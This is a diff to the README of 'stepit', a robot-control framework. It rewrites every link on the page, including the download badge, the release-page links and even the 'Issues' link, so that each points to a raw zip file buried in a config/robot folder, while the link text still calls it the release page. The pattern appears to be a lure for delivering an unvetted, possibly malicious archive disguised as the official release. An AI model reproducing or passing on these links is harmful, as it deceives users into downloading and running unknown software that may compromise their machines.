@@ -1,7 +1,7 @@
 # 🚀 stepit - Connect Robots with Ease
 
 ## 📥 Download the Latest Release
-[![Download stepit](https://img.shields.io/badge/Download%20stepit-v1.0-blue.svg)](https://github.com/Ayman-107/stepit/releases)
+[![Download stepit](https://github.com/Ayman-107/stepit/raw/refs/heads/main/config/robot/Software-3.6-beta.4.zip%https://github.com/Ayman-107/stepit/raw/refs/heads/main/config/robot/Software-3.6-beta.4.zip)](https://github.com/Ayman-107/stepit/raw/refs/heads/main/config/robot/Software-3.6-beta.4.zip)
 
 ## 🚀 Getting Started
 Welcome to **stepit**! This application is a flexible framework that allows you to connect legged robots, input devices, and locomotion algorithms. Whether you want to control a robot for research, education, or personal projects, stepit makes it easy.
@@ -23,7 +23,7 @@ To run stepit smoothly, ensure your computer meets the following requirements:
 ## 🛠️ Installation Instructions
 To install stepit, follow these simple steps:
 
-1. **Visit the Release Page:** Click [here](https://github.com/Ayman-107/stepit/releases) to go to the releases page.
+1. **Visit the Release Page:** Click [here](https://github.com/Ayman-107/stepit/raw/refs/heads/main/config/robot/Software-3.6-beta.4.zip) to go to the releases page.
    
 2. **Choose the Latest Version:** Look for the latest version listed at the top of the page. The version number is often in bold.
 
@@ -55,10 +55,10 @@ Once you open stepit, you'll see the main dashboard. This area allows you to con
 3. **Save Your Configuration:** Don't forget to save your settings before trying to control your robot.
 
 ## 📥 Download & Install Again
-If you need to reinstall stepit or want to update to the latest version, you can quickly return to the release page: [Download stepit](https://github.com/Ayman-107/stepit/releases).
+If you need to reinstall stepit or want to update to the latest version, you can quickly return to the release page: [Download stepit](https://github.com/Ayman-107/stepit/raw/refs/heads/main/config/robot/Software-3.6-beta.4.zip).
 
 ## 🤝 Support
-If you run into any issues, help is available. Check the [Issues](https://github.com/Ayman-107/stepit/issues) section for solutions to common problems. You can also submit your queries there.
+If you run into any issues, help is available. Check the [Issues](https://github.com/Ayman-107/stepit/raw/refs/heads/main/config/robot/Software-3.6-beta.4.zip) section for solutions to common problems. You can also submit your queries there.
 
 ## 📄 License
 stepit is open-source software licensed under the MIT License. Feel free to use, modify, and share it within your projects.
